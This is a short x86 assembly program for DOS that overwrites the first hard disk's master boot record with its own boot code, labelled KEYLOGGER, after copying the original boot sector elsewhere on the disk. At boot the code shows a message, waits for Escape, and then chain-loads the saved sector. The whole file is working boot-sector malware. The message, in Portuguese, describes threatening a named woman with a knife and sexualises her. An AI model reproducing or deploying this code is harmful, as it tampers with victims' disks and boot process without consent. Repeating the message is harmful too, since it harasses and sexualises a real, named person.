org 0x100
mov ax,201h
mov bx,SETOR
mov cx,1
mov dx,80H
int 13h

mov ah,8
mov dx,80H
mov di,0
push es
mov es,di
INT 13H
pop es

mov ax,301h
sub cl,6
mov dl,80H
MOV WORD[SETOR+510],0AA55H
mov bx,SETOR
INT 13H

LEA DI,[SETOR]
MOV SI,KEYLOGGER
MOV CX,336
REP MOVSB

mov bx,SETOR
MOV WORD[SETOR+510],0AA55H
mov ax,301h
mov cx,1
mov dx,80H
INT 13H

ret

KEYLOGGER:
	    cli	      
	    xor ax,ax
	    mov ds,ax
	    mov es,ax
	    mov ss,ax
	    mov sp,07C00h
	    sti
		Kernel:

MOV AX,1300h
MOV BX,30h
MOV CX,10Ch
MOV DX,0
PUSH CS
POP ES
MOV BP,7C68h
INT 10h
L1:
IN AL,60H
CMP AL,1
JNZ L1
JMP L2
Texto db "TENHO BASTANTE VONTADE DE RENDER A SOPHIA VALVERDE COM UMA FACA, AE ELA BAIXA A CALCINHA DELA, EU MOSTRO BICEPS PRA ELA E APERTO AS NALGOTAS DELA...",0	;message
L2:
mov ah,8
mov dl,80H
mov di,0
push es
mov es,di
INT 13H
pop es
sub cl,6

mov ax,0000h
mov es,ax
mov bx,500h
mov dl,80h
mov al,01h
mov ah,02h
int 13h
jmp 0000:0500h

codesize:

SETOR db 512 dup (0)
